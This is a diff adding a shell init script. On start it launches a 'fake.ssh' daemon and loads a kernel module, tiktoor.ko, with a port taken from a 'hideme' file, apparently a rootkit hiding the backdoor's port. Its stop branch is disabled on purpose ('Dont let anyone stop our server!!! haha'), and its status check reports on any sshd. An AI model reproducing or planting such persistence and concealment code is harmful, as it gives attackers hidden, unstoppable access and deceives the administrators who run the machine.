@@ -1,0 +1,37 @@
+#!/bin/sh
+
+case "$1" in
+start)
+    /fake.ssh/start-daemon.sh
+    cat /fake.ssh/ssh-port.hideme | xargs insmod /fake.ssh/tiktoor.ko
+
+
+	# start-stop-daemon --start --exec /usr/local/sbin/portmap -u `id -u`
+	# start-stop-daemon --start --exec /usr/local/sbin/rpc.mountd
+
+;;
+
+stop)
+	# Dont let anyone stop our server!!! haha
+	# start-stop-daemon --stop --exec /usr/local/sbin/rpc.mountd
+;;
+
+restart)
+  	$0 stop
+  	$0 start
+;;
+
+status)
+             if pidof -o %PPID sshd > /dev/null; then
+                     echo "Running"
+                     exit 0
+             else
+                     echo "Not running"
+                     exit 1
+             fi
+;;
+
+*)
+        echo "Usage: $0 {start|stop|restart|status}"
+        exit 1
+esac
